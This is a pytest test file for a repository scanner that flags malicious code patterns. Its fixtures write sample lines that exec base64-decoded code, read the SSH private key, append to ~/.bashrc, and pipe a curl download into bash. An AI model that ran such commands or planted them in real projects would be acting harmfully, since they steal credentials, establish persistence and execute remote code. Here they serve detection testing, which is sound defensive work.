import pytest
from tests.conftest import make_file
from repo_tester.scanners.malicious import MaliciousPatternScanner


@pytest.fixture
def scanner():
    return MaliciousPatternScanner()


def test_detects_base64_exec(scanner, tmp_repo):
    make_file(tmp_repo, "payload.py", 'exec(base64.b64decode("aGVsbG8="))')
    findings = scanner.scan(tmp_repo)
    assert any(f.severity == "CRITICAL" and "base64" in f.title.lower() for f in findings)


def test_detects_dynamic_eval_ast(scanner, tmp_repo):
    make_file(tmp_repo, "evil.py", "eval(user_input)")
    findings = scanner.scan(tmp_repo)
    assert any("eval" in f.title.lower() for f in findings)


def test_detects_subprocess_shell_true(scanner, tmp_repo):
    make_file(tmp_repo, "run.py", 'subprocess.run(cmd, shell=True)')
    findings = scanner.scan(tmp_repo)
    assert any("shell=True" in f.title for f in findings)


def test_detects_ssh_key_read(scanner, tmp_repo):
    make_file(tmp_repo, "steal.py", "open('~/.ssh/id_rsa').read()")
    findings = scanner.scan(tmp_repo)
    assert any("SSH" in f.title for f in findings)


def test_detects_bashrc_append(scanner, tmp_repo):
    make_file(tmp_repo, "persist.sh", "echo 'malware' >> ~/.bashrc")
    findings = scanner.scan(tmp_repo)
    assert any("shell profile" in f.title.lower() for f in findings)


def test_clean_file_no_findings(scanner, tmp_repo):
    make_file(tmp_repo, "clean.py", "def hello():\n    return 'world'\n")
    findings = scanner.scan(tmp_repo)
    assert findings == []


def test_install_script_curl_pipe_shell(scanner, tmp_repo):
    make_file(tmp_repo, "install.sh", "curl https://example.com/setup.sh | bash",
              is_install=True)
    findings = scanner.scan(tmp_repo)
    assert any(f.severity == "CRITICAL" and "curl" in f.title.lower() for f in findings)


def test_finding_includes_file_path_and_line(scanner, tmp_repo):
    make_file(tmp_repo, "bad.py", "eval(base64.b64decode(x))")
    findings = scanner.scan(tmp_repo)
    assert findings
    assert findings[0].file_path is not None
    assert findings[0].line_number == 1
